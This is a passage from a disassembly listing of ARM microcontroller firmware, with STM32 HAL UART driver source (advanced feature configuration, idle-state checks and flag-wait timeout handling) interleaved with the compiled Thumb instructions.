 80059ae:	69bb      	ldr	r3, [r7, #24]
 80059b0:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 80059b4:	d205      	bcs.n	80059c2 <UART_SetConfig+0x432>
      {
        huart->Instance->BRR = (uint16_t)usartdiv;
 80059b6:	69bb      	ldr	r3, [r7, #24]
 80059b8:	b29a      	uxth	r2, r3
 80059ba:	68fb      	ldr	r3, [r7, #12]
 80059bc:	681b      	ldr	r3, [r3, #0]
 80059be:	60da      	str	r2, [r3, #12]
 80059c0:	e002      	b.n	80059c8 <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 80059c2:	2301      	movs	r3, #1
 80059c4:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  huart->NbTxDataToProcess = 1;
  huart->NbRxDataToProcess = 1;
#endif /* USART_CR1_FIFOEN */

  /* Clear ISR function pointers */
  huart->RxISR = NULL;
 80059c8:	68fb      	ldr	r3, [r7, #12]
 80059ca:	2200      	movs	r2, #0
 80059cc:	669a      	str	r2, [r3, #104]	; 0x68
  huart->TxISR = NULL;
 80059ce:	68fb      	ldr	r3, [r7, #12]
 80059d0:	2200      	movs	r2, #0
 80059d2:	66da      	str	r2, [r3, #108]	; 0x6c

  return ret;
 80059d4:	f897 3022 	ldrb.w	r3, [r7, #34]	; 0x22
}
 80059d8:	4618      	mov	r0, r3
 80059da:	3728      	adds	r7, #40	; 0x28
 80059dc:	46bd      	mov	sp, r7
 80059de:	e8bd 8fb0 	ldmia.w	sp!, {r4, r5, r7, r8, r9, sl, fp, pc}
 80059e2:	bf00      	nop
 80059e4:	00f42400 	.word	0x00f42400

080059e8 <UART_AdvFeatureConfig>:
  * @brief Configure the UART peripheral advanced features.
  * @param huart UART handle.
  * @retval None
  */
void UART_AdvFeatureConfig(UART_HandleTypeDef *huart)
{
 80059e8:	b480      	push	{r7}
 80059ea:	b083      	sub	sp, #12
 80059ec:	af00      	add	r7, sp, #0
 80059ee:	6078      	str	r0, [r7, #4]
  /* Check whether the set of advanced features to configure is properly set */
  assert_param(IS_UART_ADVFEATURE_INIT(huart->AdvancedInit.AdvFeatureInit));

  /* if required, configure RX/TX pins swap */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_SWAP_INIT))
 80059f0:	687b      	ldr	r3, [r7, #4]
 80059f2:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059f4:	f003 0308 	and.w	r3, r3, #8
 80059f8:	2b00      	cmp	r3, #0
 80059fa:	d00a      	beq.n	8005a12 <UART_AdvFeatureConfig+0x2a>
  {
    assert_param(IS_UART_ADVFEATURE_SWAP(huart->AdvancedInit.Swap));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_SWAP, huart->AdvancedInit.Swap);
 80059fc:	687b      	ldr	r3, [r7, #4]
 80059fe:	681b      	ldr	r3, [r3, #0]
 8005a00:	685b      	ldr	r3, [r3, #4]
 8005a02:	f423 4100 	bic.w	r1, r3, #32768	; 0x8000
 8005a06:	687b      	ldr	r3, [r7, #4]
 8005a08:	6b5a      	ldr	r2, [r3, #52]	; 0x34
 8005a0a:	687b      	ldr	r3, [r7, #4]
 8005a0c:	681b      	ldr	r3, [r3, #0]
 8005a0e:	430a      	orrs	r2, r1
 8005a10:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure TX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_TXINVERT_INIT))
 8005a12:	687b      	ldr	r3, [r7, #4]
 8005a14:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a16:	f003 0301 	and.w	r3, r3, #1
 8005a1a:	2b00      	cmp	r3, #0
 8005a1c:	d00a      	beq.n	8005a34 <UART_AdvFeatureConfig+0x4c>
  {
    assert_param(IS_UART_ADVFEATURE_TXINV(huart->AdvancedInit.TxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_TXINV, huart->AdvancedInit.TxPinLevelInvert);
 8005a1e:	687b      	ldr	r3, [r7, #4]
 8005a20:	681b      	ldr	r3, [r3, #0]
 8005a22:	685b      	ldr	r3, [r3, #4]
 8005a24:	f423 3100 	bic.w	r1, r3, #131072	; 0x20000
 8005a28:	687b      	ldr	r3, [r7, #4]
 8005a2a:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 8005a2c:	687b      	ldr	r3, [r7, #4]
 8005a2e:	681b      	ldr	r3, [r3, #0]
 8005a30:	430a      	orrs	r2, r1
 8005a32:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXINVERT_INIT))
 8005a34:	687b      	ldr	r3, [r7, #4]
 8005a36:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a38:	f003 0302 	and.w	r3, r3, #2
 8005a3c:	2b00      	cmp	r3, #0
 8005a3e:	d00a      	beq.n	8005a56 <UART_AdvFeatureConfig+0x6e>
  {
    assert_param(IS_UART_ADVFEATURE_RXINV(huart->AdvancedInit.RxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_RXINV, huart->AdvancedInit.RxPinLevelInvert);
 8005a40:	687b      	ldr	r3, [r7, #4]
 8005a42:	681b      	ldr	r3, [r3, #0]
 8005a44:	685b      	ldr	r3, [r3, #4]
 8005a46:	f423 3180 	bic.w	r1, r3, #65536	; 0x10000
 8005a4a:	687b      	ldr	r3, [r7, #4]
 8005a4c:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8005a4e:	687b      	ldr	r3, [r7, #4]
 8005a50:	681b      	ldr	r3, [r3, #0]
 8005a52:	430a      	orrs	r2, r1
 8005a54:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure data inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DATAINVERT_INIT))
 8005a56:	687b      	ldr	r3, [r7, #4]
 8005a58:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a5a:	f003 0304 	and.w	r3, r3, #4
 8005a5e:	2b00      	cmp	r3, #0
 8005a60:	d00a      	beq.n	8005a78 <UART_AdvFeatureConfig+0x90>
  {
    assert_param(IS_UART_ADVFEATURE_DATAINV(huart->AdvancedInit.DataInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_DATAINV, huart->AdvancedInit.DataInvert);
 8005a62:	687b      	ldr	r3, [r7, #4]
 8005a64:	681b      	ldr	r3, [r3, #0]
 8005a66:	685b      	ldr	r3, [r3, #4]
 8005a68:	f423 2180 	bic.w	r1, r3, #262144	; 0x40000
 8005a6c:	687b      	ldr	r3, [r7, #4]
 8005a6e:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 8005a70:	687b      	ldr	r3, [r7, #4]
 8005a72:	681b      	ldr	r3, [r3, #0]
 8005a74:	430a      	orrs	r2, r1
 8005a76:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX overrun detection disabling */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXOVERRUNDISABLE_INIT))
 8005a78:	687b      	ldr	r3, [r7, #4]
 8005a7a:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a7c:	f003 0310 	and.w	r3, r3, #16
 8005a80:	2b00      	cmp	r3, #0
 8005a82:	d00a      	beq.n	8005a9a <UART_AdvFeatureConfig+0xb2>
  {
    assert_param(IS_UART_OVERRUN(huart->AdvancedInit.OverrunDisable));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_OVRDIS, huart->AdvancedInit.OverrunDisable);
 8005a84:	687b      	ldr	r3, [r7, #4]
 8005a86:	681b      	ldr	r3, [r3, #0]
 8005a88:	689b      	ldr	r3, [r3, #8]
 8005a8a:	f423 5180 	bic.w	r1, r3, #4096	; 0x1000
 8005a8e:	687b      	ldr	r3, [r7, #4]
 8005a90:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8005a92:	687b      	ldr	r3, [r7, #4]
 8005a94:	681b      	ldr	r3, [r3, #0]
 8005a96:	430a      	orrs	r2, r1
 8005a98:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure DMA disabling on reception error */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DMADISABLEONERROR_INIT))
 8005a9a:	687b      	ldr	r3, [r7, #4]
 8005a9c:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a9e:	f003 0320 	and.w	r3, r3, #32
 8005aa2:	2b00      	cmp	r3, #0
 8005aa4:	d00a      	beq.n	8005abc <UART_AdvFeatureConfig+0xd4>
  {
    assert_param(IS_UART_ADVFEATURE_DMAONRXERROR(huart->AdvancedInit.DMADisableonRxError));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_DDRE, huart->AdvancedInit.DMADisableonRxError);
 8005aa6:	687b      	ldr	r3, [r7, #4]
 8005aa8:	681b      	ldr	r3, [r3, #0]
 8005aaa:	689b      	ldr	r3, [r3, #8]
 8005aac:	f423 5100 	bic.w	r1, r3, #8192	; 0x2000
 8005ab0:	687b      	ldr	r3, [r7, #4]
 8005ab2:	6bda      	ldr	r2, [r3, #60]	; 0x3c
 8005ab4:	687b      	ldr	r3, [r7, #4]
 8005ab6:	681b      	ldr	r3, [r3, #0]
 8005ab8:	430a      	orrs	r2, r1
 8005aba:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure auto Baud rate detection scheme */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_AUTOBAUDRATE_INIT))
 8005abc:	687b      	ldr	r3, [r7, #4]
 8005abe:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005ac0:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005ac4:	2b00      	cmp	r3, #0
 8005ac6:	d01a      	beq.n	8005afe <UART_AdvFeatureConfig+0x116>
  {
    assert_param(IS_USART_AUTOBAUDRATE_DETECTION_INSTANCE(huart->Instance));
    assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATE(huart->AdvancedInit.AutoBaudRateEnable));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_ABREN, huart->AdvancedInit.AutoBaudRateEnable);
 8005ac8:	687b      	ldr	r3, [r7, #4]
 8005aca:	681b      	ldr	r3, [r3, #0]
 8005acc:	685b      	ldr	r3, [r3, #4]
 8005ace:	f423 1180 	bic.w	r1, r3, #1048576	; 0x100000
 8005ad2:	687b      	ldr	r3, [r7, #4]
 8005ad4:	6c1a      	ldr	r2, [r3, #64]	; 0x40
 8005ad6:	687b      	ldr	r3, [r7, #4]
 8005ad8:	681b      	ldr	r3, [r3, #0]
 8005ada:	430a      	orrs	r2, r1
 8005adc:	605a      	str	r2, [r3, #4]
    /* set auto Baudrate detection parameters if detection is enabled */
    if (huart->AdvancedInit.AutoBaudRateEnable == UART_ADVFEATURE_AUTOBAUDRATE_ENABLE)
 8005ade:	687b      	ldr	r3, [r7, #4]
 8005ae0:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8005ae2:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005ae6:	d10a      	bne.n	8005afe <UART_AdvFeatureConfig+0x116>
    {
      assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATEMODE(huart->AdvancedInit.AutoBaudRateMode));
      MODIFY_REG(huart->Instance->CR2, USART_CR2_ABRMODE, huart->AdvancedInit.AutoBaudRateMode);
 8005ae8:	687b      	ldr	r3, [r7, #4]
 8005aea:	681b      	ldr	r3, [r3, #0]
 8005aec:	685b      	ldr	r3, [r3, #4]
 8005aee:	f423 01c0 	bic.w	r1, r3, #6291456	; 0x600000
 8005af2:	687b      	ldr	r3, [r7, #4]
 8005af4:	6c5a      	ldr	r2, [r3, #68]	; 0x44
 8005af6:	687b      	ldr	r3, [r7, #4]
 8005af8:	681b      	ldr	r3, [r3, #0]
 8005afa:	430a      	orrs	r2, r1
 8005afc:	605a      	str	r2, [r3, #4]
    }
  }

  /* if required, configure MSB first on communication line */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_MSBFIRST_INIT))
 8005afe:	687b      	ldr	r3, [r7, #4]
 8005b00:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005b02:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005b06:	2b00      	cmp	r3, #0
 8005b08:	d00a      	beq.n	8005b20 <UART_AdvFeatureConfig+0x138>
  {
    assert_param(IS_UART_ADVFEATURE_MSBFIRST(huart->AdvancedInit.MSBFirst));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_MSBFIRST, huart->AdvancedInit.MSBFirst);
 8005b0a:	687b      	ldr	r3, [r7, #4]
 8005b0c:	681b      	ldr	r3, [r3, #0]
 8005b0e:	685b      	ldr	r3, [r3, #4]
 8005b10:	f423 2100 	bic.w	r1, r3, #524288	; 0x80000
 8005b14:	687b      	ldr	r3, [r7, #4]
 8005b16:	6c9a      	ldr	r2, [r3, #72]	; 0x48
 8005b18:	687b      	ldr	r3, [r7, #4]
 8005b1a:	681b      	ldr	r3, [r3, #0]
 8005b1c:	430a      	orrs	r2, r1
 8005b1e:	605a      	str	r2, [r3, #4]
  }
}
 8005b20:	bf00      	nop
 8005b22:	370c      	adds	r7, #12
 8005b24:	46bd      	mov	sp, r7
 8005b26:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005b2a:	4770      	bx	lr

08005b2c <UART_CheckIdleState>:
  * @brief Check the UART Idle State.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_CheckIdleState(UART_HandleTypeDef *huart)
{
 8005b2c:	b580      	push	{r7, lr}
 8005b2e:	b098      	sub	sp, #96	; 0x60
 8005b30:	af02      	add	r7, sp, #8
 8005b32:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;

  /* Initialize the UART ErrorCode */
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8005b34:	687b      	ldr	r3, [r7, #4]
 8005b36:	2200      	movs	r2, #0
 8005b38:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

  /* Init tickstart for timeout management */
  tickstart = HAL_GetTick();
 8005b3c:	f7fb fb62 	bl	8001204 <HAL_GetTick>
 8005b40:	6578      	str	r0, [r7, #84]	; 0x54

  /* Check if the Transmitter is enabled */
  if ((huart->Instance->CR1 & USART_CR1_TE) == USART_CR1_TE)
 8005b42:	687b      	ldr	r3, [r7, #4]
 8005b44:	681b      	ldr	r3, [r3, #0]
 8005b46:	681b      	ldr	r3, [r3, #0]
 8005b48:	f003 0308 	and.w	r3, r3, #8
 8005b4c:	2b08      	cmp	r3, #8
 8005b4e:	d12e      	bne.n	8005bae <UART_CheckIdleState+0x82>
  {
    /* Wait until TEACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_TEACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005b50:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005b54:	9300      	str	r3, [sp, #0]
 8005b56:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005b58:	2200      	movs	r2, #0
 8005b5a:	f44f 1100 	mov.w	r1, #2097152	; 0x200000
 8005b5e:	6878      	ldr	r0, [r7, #4]
 8005b60:	f000 f88c 	bl	8005c7c <UART_WaitOnFlagUntilTimeout>
 8005b64:	4603      	mov	r3, r0
 8005b66:	2b00      	cmp	r3, #0
 8005b68:	d021      	beq.n	8005bae <UART_CheckIdleState+0x82>
    {
      /* Disable TXE interrupt for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE_TXFNFIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE));
 8005b6a:	687b      	ldr	r3, [r7, #4]
 8005b6c:	681b      	ldr	r3, [r3, #0]
 8005b6e:	63bb      	str	r3, [r7, #56]	; 0x38
 */
__STATIC_FORCEINLINE uint32_t __LDREXW(volatile uint32_t *addr)
{
    uint32_t result;

   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005b70:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005b72:	e853 3f00 	ldrex	r3, [r3]
 8005b76:	637b      	str	r3, [r7, #52]	; 0x34
   return(result);
 8005b78:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005b7a:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005b7e:	653b      	str	r3, [r7, #80]	; 0x50
 8005b80:	687b      	ldr	r3, [r7, #4]
 8005b82:	681b      	ldr	r3, [r3, #0]
 8005b84:	461a      	mov	r2, r3
 8005b86:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8005b88:	647b      	str	r3, [r7, #68]	; 0x44
 8005b8a:	643a      	str	r2, [r7, #64]	; 0x40
 */
__STATIC_FORCEINLINE uint32_t __STREXW(uint32_t value, volatile uint32_t *addr)
{
   uint32_t result;

   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005b8c:	6c39      	ldr	r1, [r7, #64]	; 0x40
 8005b8e:	6c7a      	ldr	r2, [r7, #68]	; 0x44
 8005b90:	e841 2300 	strex	r3, r2, [r1]
 8005b94:	63fb      	str	r3, [r7, #60]	; 0x3c
   return(result);
 8005b96:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8005b98:	2b00      	cmp	r3, #0
 8005b9a:	d1e6      	bne.n	8005b6a <UART_CheckIdleState+0x3e>
#endif /* USART_CR1_FIFOEN */

      huart->gState = HAL_UART_STATE_READY;
 8005b9c:	687b      	ldr	r3, [r7, #4]
 8005b9e:	2220      	movs	r2, #32
 8005ba0:	67da      	str	r2, [r3, #124]	; 0x7c

      __HAL_UNLOCK(huart);
 8005ba2:	687b      	ldr	r3, [r7, #4]
 8005ba4:	2200      	movs	r2, #0
 8005ba6:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005baa:	2303      	movs	r3, #3
 8005bac:	e062      	b.n	8005c74 <UART_CheckIdleState+0x148>
    }
  }

  /* Check if the Receiver is enabled */
  if ((huart->Instance->CR1 & USART_CR1_RE) == USART_CR1_RE)
 8005bae:	687b      	ldr	r3, [r7, #4]
 8005bb0:	681b      	ldr	r3, [r3, #0]
 8005bb2:	681b      	ldr	r3, [r3, #0]
 8005bb4:	f003 0304 	and.w	r3, r3, #4
 8005bb8:	2b04      	cmp	r3, #4
 8005bba:	d149      	bne.n	8005c50 <UART_CheckIdleState+0x124>
  {
    /* Wait until REACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005bbc:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005bc0:	9300      	str	r3, [sp, #0]
 8005bc2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005bc4:	2200      	movs	r2, #0
 8005bc6:	f44f 0180 	mov.w	r1, #4194304	; 0x400000
 8005bca:	6878      	ldr	r0, [r7, #4]
 8005bcc:	f000 f856 	bl	8005c7c <UART_WaitOnFlagUntilTimeout>
 8005bd0:	4603      	mov	r3, r0
 8005bd2:	2b00      	cmp	r3, #0
 8005bd4:	d03c      	beq.n	8005c50 <UART_CheckIdleState+0x124>
      /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error)
      interrupts for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005bd6:	687b      	ldr	r3, [r7, #4]
 8005bd8:	681b      	ldr	r3, [r3, #0]
 8005bda:	627b      	str	r3, [r7, #36]	; 0x24
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005bdc:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005bde:	e853 3f00 	ldrex	r3, [r3]
 8005be2:	623b      	str	r3, [r7, #32]
   return(result);
 8005be4:	6a3b      	ldr	r3, [r7, #32]
 8005be6:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005bea:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005bec:	687b      	ldr	r3, [r7, #4]
 8005bee:	681b      	ldr	r3, [r3, #0]
 8005bf0:	461a      	mov	r2, r3
 8005bf2:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005bf4:	633b      	str	r3, [r7, #48]	; 0x30
 8005bf6:	62fa      	str	r2, [r7, #44]	; 0x2c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005bf8:	6af9      	ldr	r1, [r7, #44]	; 0x2c
 8005bfa:	6b3a      	ldr	r2, [r7, #48]	; 0x30
 8005bfc:	e841 2300 	strex	r3, r2, [r1]
 8005c00:	62bb      	str	r3, [r7, #40]	; 0x28
   return(result);
 8005c02:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8005c04:	2b00      	cmp	r3, #0
 8005c06:	d1e6      	bne.n	8005bd6 <UART_CheckIdleState+0xaa>
#endif /* USART_CR1_FIFOEN */
      ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005c08:	687b      	ldr	r3, [r7, #4]
 8005c0a:	681b      	ldr	r3, [r3, #0]
 8005c0c:	3308      	adds	r3, #8
 8005c0e:	613b      	str	r3, [r7, #16]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005c10:	693b      	ldr	r3, [r7, #16]
 8005c12:	e853 3f00 	ldrex	r3, [r3]
 8005c16:	60fb      	str	r3, [r7, #12]
   return(result);
 8005c18:	68fb      	ldr	r3, [r7, #12]
 8005c1a:	f023 0301 	bic.w	r3, r3, #1
 8005c1e:	64bb      	str	r3, [r7, #72]	; 0x48
 8005c20:	687b      	ldr	r3, [r7, #4]
 8005c22:	681b      	ldr	r3, [r3, #0]
 8005c24:	3308      	adds	r3, #8
 8005c26:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005c28:	61fa      	str	r2, [r7, #28]
 8005c2a:	61bb      	str	r3, [r7, #24]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005c2c:	69b9      	ldr	r1, [r7, #24]
 8005c2e:	69fa      	ldr	r2, [r7, #28]
 8005c30:	e841 2300 	strex	r3, r2, [r1]
 8005c34:	617b      	str	r3, [r7, #20]
   return(result);
 8005c36:	697b      	ldr	r3, [r7, #20]
 8005c38:	2b00      	cmp	r3, #0
 8005c3a:	d1e5      	bne.n	8005c08 <UART_CheckIdleState+0xdc>

      huart->RxState = HAL_UART_STATE_READY;
 8005c3c:	687b      	ldr	r3, [r7, #4]
 8005c3e:	2220      	movs	r2, #32
 8005c40:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80

      __HAL_UNLOCK(huart);
 8005c44:	687b      	ldr	r3, [r7, #4]
 8005c46:	2200      	movs	r2, #0
 8005c48:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005c4c:	2303      	movs	r3, #3
 8005c4e:	e011      	b.n	8005c74 <UART_CheckIdleState+0x148>
    }
  }

  /* Initialize the UART State */
  huart->gState = HAL_UART_STATE_READY;
 8005c50:	687b      	ldr	r3, [r7, #4]
 8005c52:	2220      	movs	r2, #32
 8005c54:	67da      	str	r2, [r3, #124]	; 0x7c
  huart->RxState = HAL_UART_STATE_READY;
 8005c56:	687b      	ldr	r3, [r7, #4]
 8005c58:	2220      	movs	r2, #32
 8005c5a:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005c5e:	687b      	ldr	r3, [r7, #4]
 8005c60:	2200      	movs	r2, #0
 8005c62:	661a      	str	r2, [r3, #96]	; 0x60
  huart->RxEventType = HAL_UART_RXEVENT_TC;
 8005c64:	687b      	ldr	r3, [r7, #4]
 8005c66:	2200      	movs	r2, #0
 8005c68:	665a      	str	r2, [r3, #100]	; 0x64

  __HAL_UNLOCK(huart);
 8005c6a:	687b      	ldr	r3, [r7, #4]
 8005c6c:	2200      	movs	r2, #0
 8005c6e:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

  return HAL_OK;
 8005c72:	2300      	movs	r3, #0
}
 8005c74:	4618      	mov	r0, r3
 8005c76:	3758      	adds	r7, #88	; 0x58
 8005c78:	46bd      	mov	sp, r7
 8005c7a:	bd80      	pop	{r7, pc}

08005c7c <UART_WaitOnFlagUntilTimeout>:
  * @param Timeout   Timeout duration
  * @retval HAL status
  */
HAL_StatusTypeDef UART_WaitOnFlagUntilTimeout(UART_HandleTypeDef *huart, uint32_t Flag, FlagStatus Status,
                                              uint32_t Tickstart, uint32_t Timeout)
{
 8005c7c:	b580      	push	{r7, lr}
 8005c7e:	b084      	sub	sp, #16
 8005c80:	af00      	add	r7, sp, #0
 8005c82:	60f8      	str	r0, [r7, #12]
 8005c84:	60b9      	str	r1, [r7, #8]
 8005c86:	603b      	str	r3, [r7, #0]
 8005c88:	4613      	mov	r3, r2
 8005c8a:	71fb      	strb	r3, [r7, #7]
  /* Wait until flag is set */
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005c8c:	e049      	b.n	8005d22 <UART_WaitOnFlagUntilTimeout+0xa6>
  {
    /* Check for the Timeout */
    if (Timeout != HAL_MAX_DELAY)
 8005c8e:	69bb      	ldr	r3, [r7, #24]
 8005c90:	f1b3 3fff 	cmp.w	r3, #4294967295
 8005c94:	d045      	beq.n	8005d22 <UART_WaitOnFlagUntilTimeout+0xa6>
    {
      if (((HAL_GetTick() - Tickstart) > Timeout) || (Timeout == 0U))
 8005c96:	f7fb fab5 	bl	8001204 <HAL_GetTick>
 8005c9a:	4602      	mov	r2, r0
 8005c9c:	683b      	ldr	r3, [r7, #0]
 8005c9e:	1ad3      	subs	r3, r2, r3
 8005ca0:	69ba      	ldr	r2, [r7, #24]
 8005ca2:	429a      	cmp	r2, r3
 8005ca4:	d302      	bcc.n	8005cac <UART_WaitOnFlagUntilTimeout+0x30>
 8005ca6:	69bb      	ldr	r3, [r7, #24]
 8005ca8:	2b00      	cmp	r3, #0
 8005caa:	d101      	bne.n	8005cb0 <UART_WaitOnFlagUntilTimeout+0x34>
      {

        return HAL_TIMEOUT;
 8005cac:	2303      	movs	r3, #3
 8005cae:	e048      	b.n	8005d42 <UART_WaitOnFlagUntilTimeout+0xc6>
      }

      if (READ_BIT(huart->Instance->CR1, USART_CR1_RE) != 0U)
 8005cb0:	68fb      	ldr	r3, [r7, #12]
 8005cb2:	681b      	ldr	r3, [r3, #0]
 8005cb4:	681b      	ldr	r3, [r3, #0]
 8005cb6:	f003 0304 	and.w	r3, r3, #4
 8005cba:	2b00      	cmp	r3, #0
 8005cbc:	d031      	beq.n	8005d22 <UART_WaitOnFlagUntilTimeout+0xa6>
      {
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_ORE) == SET)
 8005cbe:	68fb      	ldr	r3, [r7, #12]
 8005cc0:	681b      	ldr	r3, [r3, #0]
 8005cc2:	69db      	ldr	r3, [r3, #28]
 8005cc4:	f003 0308 	and.w	r3, r3, #8
 8005cc8:	2b08      	cmp	r3, #8
 8005cca:	d110      	bne.n	8005cee <UART_WaitOnFlagUntilTimeout+0x72>
        {
          /* Clear Overrun Error flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF);
 8005ccc:	68fb      	ldr	r3, [r7, #12]
 8005cce:	681b      	ldr	r3, [r3, #0]
 8005cd0:	2208      	movs	r2, #8
 8005cd2:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005cd4:	68f8      	ldr	r0, [r7, #12]
 8005cd6:	f000 f838 	bl	8005d4a <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_ORE;
 8005cda:	68fb      	ldr	r3, [r7, #12]
 8005cdc:	2208      	movs	r2, #8
 8005cde:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005ce2:	68fb      	ldr	r3, [r7, #12]
 8005ce4:	2200      	movs	r2, #0
 8005ce6:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_ERROR;
 8005cea:	2301      	movs	r3, #1
 8005cec:	e029      	b.n	8005d42 <UART_WaitOnFlagUntilTimeout+0xc6>
        }
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_RTOF) == SET)
 8005cee:	68fb      	ldr	r3, [r7, #12]
 8005cf0:	681b      	ldr	r3, [r3, #0]
 8005cf2:	69db      	ldr	r3, [r3, #28]
 8005cf4:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8005cf8:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005cfc:	d111      	bne.n	8005d22 <UART_WaitOnFlagUntilTimeout+0xa6>
        {
          /* Clear Receiver Timeout flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_RTOF);
 8005cfe:	68fb      	ldr	r3, [r7, #12]
 8005d00:	681b      	ldr	r3, [r3, #0]
 8005d02:	f44f 6200 	mov.w	r2, #2048	; 0x800
